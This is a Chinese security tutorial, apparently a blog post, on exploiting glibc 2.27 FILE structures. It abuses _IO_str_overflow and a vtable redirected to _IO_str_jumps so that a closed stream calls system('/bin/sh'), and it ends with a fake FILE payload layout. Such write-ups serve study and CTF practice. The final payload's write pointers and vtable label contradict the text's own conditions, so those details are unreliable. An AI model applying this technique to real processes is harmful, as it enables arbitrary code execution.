> 原文链接: https://www.anquanke.com//post/id/209332 


# glibc 2.27 FILE Structure Exploitation (_IO_str_overflow)


                                阅读量   
                                **122294**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t010a00ec7bc3fcf3a9.jpg)](https://p3.ssl.qhimg.com/t010a00ec7bc3fcf3a9.jpg)



## 1、前置知识

用fopen打开一个文件，会在heap申请一块内存，并把指针放在栈上。

fopen 会返回一个FILE 结构体

```
struct _IO_FILE_plus
`{`
  _IO_FILE file;
  const struct 
      *vtable;
`}`;

struct _IO_FILE `{`
  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;    /* Current read pointer */
  char* _IO_read_end;    /* End of get area. */
  char* _IO_read_base;    /* Start of putback+get area. */
  char* _IO_write_base;    /* Start of put area. */
  char* _IO_write_ptr;    /* Current put pointer. */
  char* _IO_write_end;    /* End of put area. */
  char* _IO_buf_base;    /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;//  fd number
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
`}`;
```

简要分析下 fopen 的执行流程：

[![](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628200553549.png)](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628200553549.png)

这里能看到，fopen调用的是`__fopen_internal`

```
_IO_FILE *
__fopen_internal (const char *filename, const char *mode, int is32)
`{`
  struct locked_FILE //自己定义了一个结构
  `{`
    struct _IO_FILE_plus fp;
#ifdef _IO_MTSAFE_IO
    _IO_lock_t lock;
#endif
    struct _IO_wide_data wd;
  `}` *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));

  if (new_f == NULL)
    return NULL;
#ifdef _IO_MTSAFE_IO
  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;
#endif
  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);//初始化
  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;
    //给vtable 赋值 #define _IO_JUMPS(THIS) (THIS)-&gt;vtable
  _IO_new_file_init_internal (&amp;new_f-&gt;fp);// 这个就是把 当前的 _IO_FILE_plus fp 加入chain
    #if  !_IO_UNIFIED_JUMPTABLES
  new_f-&gt;fp.vtable = NULL;
#endif
  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)//打开文件
    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);
  _IO_un_link (&amp;new_f-&gt;fp);//失败就从链表上卸载下来
  free (new_f);// free掉
  return NULL;
`}`
```

_IO_no_init内就是一些初始化的操作

```
void
_IO_no_init (_IO_FILE *fp, int flags, int orientation,
         struct _IO_wide_data *wd, const struct _IO_jump_t *jmp)
`{`
  _IO_old_init (fp, flags);//初始化_IO_FILE的 下面树初始化 wide character streams
  fp-&gt;_mode = orientation;
  if (orientation &gt;= 0)// orientation 这个是=0的
      //_IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);
    `{`
      // wide_data 是 wide character streams 处理宽字节的
      fp-&gt;_wide_data = wd;
      fp-&gt;_wide_data-&gt;_IO_buf_base = NULL;
      fp-&gt;_wide_data-&gt;_IO_buf_end = NULL;
      fp-&gt;_wide_data-&gt;_IO_read_base = NULL;
      fp-&gt;_wide_data-&gt;_IO_read_ptr = NULL;
      fp-&gt;_wide_data-&gt;_IO_read_end = NULL;
      fp-&gt;_wide_data-&gt;_IO_write_base = NULL;
      fp-&gt;_wide_data-&gt;_IO_write_ptr = NULL;
      fp-&gt;_wide_data-&gt;_IO_write_end = NULL;
      fp-&gt;_wide_data-&gt;_IO_save_base = NULL;
      fp-&gt;_wide_data-&gt;_IO_backup_base = NULL;
      fp-&gt;_wide_data-&gt;_IO_save_end = NULL;

      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;
    `}`
  else
    /* Cause predictable crash when a wide function is called on a byte
       stream.  */
    fp-&gt;_wide_data = (struct _IO_wide_data *) -1L;
  fp-&gt;_freeres_list = NULL;
`}`
void
_IO_old_init (_IO_FILE *fp, int flags)
`{`
  fp-&gt;_flags = _IO_MAGIC|flags;
  fp-&gt;_flags2 = 0;
  if (stdio_needs_locking)
    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;
  fp-&gt;_IO_buf_base = NULL;
  fp-&gt;_IO_buf_end = NULL;
  fp-&gt;_IO_read_base = NULL;
  fp-&gt;_IO_read_ptr = NULL;
  fp-&gt;_IO_read_end = NULL;
  fp-&gt;_IO_write_base = NULL;
  fp-&gt;_IO_write_ptr = NULL;
  fp-&gt;_IO_write_end = NULL;
  fp-&gt;_chain = NULL; /* Not necessary. */

  fp-&gt;_IO_save_base = NULL;
  fp-&gt;_IO_backup_base = NULL;
  fp-&gt;_IO_save_end = NULL;
  fp-&gt;_markers = NULL;
  fp-&gt;_cur_column = 0;
#if _IO_JUMPS_OFFSET
  fp-&gt;_vtable_offset = 0;
#endif
#ifdef _IO_MTSAFE_IO
  if (fp-&gt;_lock != NULL)
    _IO_lock_init (*fp-&gt;_lock);
#endif
`}`
```

```
void
_IO_new_file_init_internal (struct _IO_FILE_plus *fp)
`{`
  /* POSIX.1 allows another file handle to be used to change the position
     of our file descriptor.  Hence we actually don't know the actual
     position before we do the first fseek (and until a following fflush). */
  fp-&gt;file._offset = _IO_pos_BAD;
  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;

  _IO_link_in (fp);//加入链表
  fp-&gt;file._fileno = -1;
`}`
```

_IO_list_all 内保存的是当前最新的FILE结构体，而FILE里面的`chain字段`保存的上一个FILE，fileno = 上一次fileno+1.fileno 分配过多，最后又会回到 0.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628204110725.png)

vtable就是一个好东西，里面全是函数，但不能随意修改，因为libc对这个有检测

[![](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628204327586.png)](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628204327586.png)



## 2、_IO_str_overflow利用

先写出 _IO_str_overflow的利用链

```
close -&gt; finish -&gt; _IO_str_overflow -&gt;(char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
```

总的来说就是调用_IO_str_overflow函数，也就是 vtable里面的overflow

[![](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628205602974.png)](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628205602974.png)

先看看 `_IO_new_fclose`

```
int
_IO_new_fclose (_IO_FILE *fp)
`{`
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp); // 这里是关键 把finish 覆盖成_IO_str_overflow
  if (fp-&gt;_mode &gt; 0)
    `{`
      /* This stream has a wide orientation.  This means we have to free
     the conversion functions.  */
      struct _IO_codecvt *cc = fp-&gt;_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);
      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);
      __libc_lock_unlock (__gconv_lock);
    `}`
  else
    `{`
      if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
    `}`
  if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)
    `{`
      fp-&gt;_IO_file_flags = 0;
      free(fp);
    `}`

  return status;
`}`
```

### <a class="reference-link" name="%E7%AC%AC%E4%B8%80%E6%AD%A5%E5%85%88%E8%A6%86%E7%9B%96vtable"></a>第一步先覆盖vtable

[![](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628210125350.png)](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628210125350.png)

```
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
`{`
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;//检测
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset &gt;= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
`}`
```

在每次调用的时候，会有一次检测，检测是否在`__libc_IO_vtables`内，这个范围很大，里面有很多种IO_x_jumps_x，这次选的是_IO_str_jumps

[![](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628210352404.png)](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200628210352404.png)

原本的vtable是指向 `__GI__IO_file_jumps`头，然后调用finish的时候是按照偏移来计算，如果这时候把vtable修改成 `_IO_str_jumps+8`那调用finish就会调用`overflow`

那vtable的修改就完成了，现在来看看`_IO_str_overflow`

```
int
_IO_str_overflow (_IO_FILE *fp, int c)
`{`
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp-&gt;_flags &amp; _IO_NO_WRITES)

      return flush_only ? 0 : EOF;
  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
    `{`
      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
    `}`
  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
    `{`
      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
      else
    `{`
      char *new_buf;
      char *old_buf = fp-&gt;_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      _IO_size_t new_size = 2 * old_blen + 100;
      if (new_size &lt; old_blen)
        return EOF;
      new_buf
        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);//目的
      if (new_buf == NULL)
        `{`
          /*      __ferror(fp) = 1; */
          return EOF;
        `}`
      if (old_buf)
        `{`
          memcpy (new_buf, old_buf, old_blen);
          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);
          /* Make sure _IO_setb won't try to delete _IO_buf_base. */
          fp-&gt;_IO_buf_base = NULL;
        `}`
      memset (new_buf + old_blen, '', new_size - old_blen);

      _IO_setb (fp, new_buf, new_buf + new_size, 1);
      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);

      fp-&gt;_IO_write_base = new_buf;
      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
    `}`
    `}`

  if (!flush_only)
    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;
  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
  return c;
`}`
libc_hidden_def (_IO_str_overflow)

```

现在就开始考虑能够执行 `(char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);`的约束条件了

```
1、fp-&gt;_flags &amp; _IO_NO_WRITES   false
2、((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) false

3、
pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
#define  _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)
pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only false

_IO_MAGIC 0xFBAD0000
_IO_NO_WRITES  8
_IO_TIED_PUT_GET 0x400
_IO_CURRENTLY_PUTTING 0x800
```

满足上面三个条件就能进入下面

```
flags:直接暴力 为 0；就好
fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base  &gt;=  (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base
这个自己构造下就好  
_IO_buf_base
_IO_buf_end
_IO_write_base
_IO_write_ptr
```

但如果用`(char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size)`来执行system(“/bin/sh”);

那new_size = “/bin/sh”的地址,那来看看 new_size是如何计算的，还有allocate_buff的位置

```
char *new_buf;
      char *old_buf = fp-&gt;_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      _IO_size_t new_size = 2 * old_blen + 100;
      if (new_size &lt; old_blen)
        return EOF;
      new_buf
        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);

```

从上面能看出来`new_size` = 2*(fp)-&gt;_IO_buf_end – (fp)-&gt;_IO_buf_base +100

那 (fp)-&gt;_IO_buf_end – (fp)-&gt;_IO_buf_base = (new_size – 100 )/2

IO_buf_base 设置为零，这样会好算点。

：(bin_sh_addr – 100) /2 就是 _IO_buf_end

现在就缺 `_allocate_buffer`的偏移了，要计算这个就要涉及到结构体之间的转换，但偏移是一样的

```
最初传进来的 fp是
_IO_str_overflow (_IO_FILE *fp, int c)
然后在这里会转换成(char *) (*((_IO_strfile *) fp)
那就是 _IO_FILE 和 _IO_strfile的转换
```

_IO_FILE

```
struct _IO_FILE `{`
  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;    /* Current read pointer */
  char* _IO_read_end;    /* End of get area. */
  char* _IO_read_base;    /* Start of putback+get area. */
  char* _IO_write_base;    /* Start of put area. */
  char* _IO_write_ptr;    /* Current put pointer. */
  char* _IO_write_end;    /* End of put area. */
  char* _IO_buf_base;    /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
`}`;
```

_IO_strfile

```
typedef struct _IO_strfile_
`{`
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
`}` _IO_strfile;

struct _IO_streambuf //看道这个就想起了 _IO_FILE_plus
`{`
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
`}`;
struct _IO_str_fields
`{`
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
`}`;
```

[![](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200629000116815.png)](https://raw.githubusercontent.com/leave-Devour/leave-devour.github.io/master/images/image-20200629000116815.png)

那 _IO_FILE_plus的vtable就在0xd8，然后0xe0下面就是 _allocate_buffer

lock要指向一个内存值为0的地方

payload：

```
rdi = bin/sh的地址

_flags = 0,
_IO_read_ptr = 0,
_IO_read_end = 0,
_IO_read_base = 0,
_IO_write_base = (rdi-100)/2,
_IO_write_ptr = 0,
_IO_write_end = 0,
_IO_buf_base = 0,
_IO_buf_end = (rdi-100)/2,
_IO_save_base = 0,
_IO_backup_base = 0,
_IO_save_end = 0,
_IO_marker = 0,
_IO_chain = 0,
_fileno = 0,
_lock = [memery]=&gt;0
vtable  = _IO_str_overflow +8
rip =&gt;system
```

参考：

[FILE_Exploit](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/)
